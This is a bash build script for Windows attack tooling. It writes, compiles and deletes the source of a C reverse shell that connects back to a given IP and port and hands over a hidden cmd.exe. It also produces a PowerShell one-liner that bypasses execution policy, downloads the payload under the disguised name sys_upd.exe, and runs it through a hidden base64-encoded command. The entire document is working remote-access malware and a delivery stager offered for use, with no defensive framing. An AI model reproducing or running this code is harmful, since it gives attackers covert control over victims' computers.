#!/bin/bash

echo -e "\e[1;32m[*]\e[0m Building Native C Victim..."

# 1. Create Native C Source
cat <<EOF > native_victim.c
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32")

int main(int argc, char *argv[]) {
    if (argc < 3) return 1;
    char *ip = argv[1];
    int port = atoi(argv[2]);
    WSADATA wsaData;
    SOCKET s;
    struct sockaddr_in addr;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);

    // Handshake
    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (WSAConnect(s, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == 0) {
        send(s, "WINDOWS_SHELL\n", 14, 0);
        closesocket(s);
    }
    Sleep(2000); 

    // Shell
    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (WSAConnect(s, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == 0) {
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
        si.wShowWindow = SW_HIDE;
        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, INFINITE);
    }
    return 0;
}
EOF

# 2. Compile for Windows
x86_64-w64-mingw32-gcc native_victim.c -o payload.binary -lws2_32 -mwindows
rm native_victim.c

echo -e "\e[1;32m[+]\e[0m Native payload compiled: \e[1;33mpayload.binary\e[0m"

# 3. Create the One-Liner Generator Script
# This bash script will print the exact string you need to copy-paste.
cat <<'EOF' > windows_one_liner.txt
powershell.exe -ExecutionPolicy Bypass -Command "& { $u='URL_HERE'; $i='IP_HERE'; $p='PORT_HERE'; $s=\"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; `$f='`$env:TEMP\sys_upd.exe'; (New-Object Net.WebClient).DownloadFile('$u',`$f); Start-Process `$f -ArgumentList '$i $p' \"; $e=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($s)); powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $e }"
EOF

echo -e "\e[1;32m[+]\e[0m Success! One-liner template saved to: \e[1;33mwindows_one_liner.txt\e[0m"
echo -e "\n\e[1;34m[*] To use, copy the line below and replace the placeholders:\e[0m"
cat windows_one_liner.txt
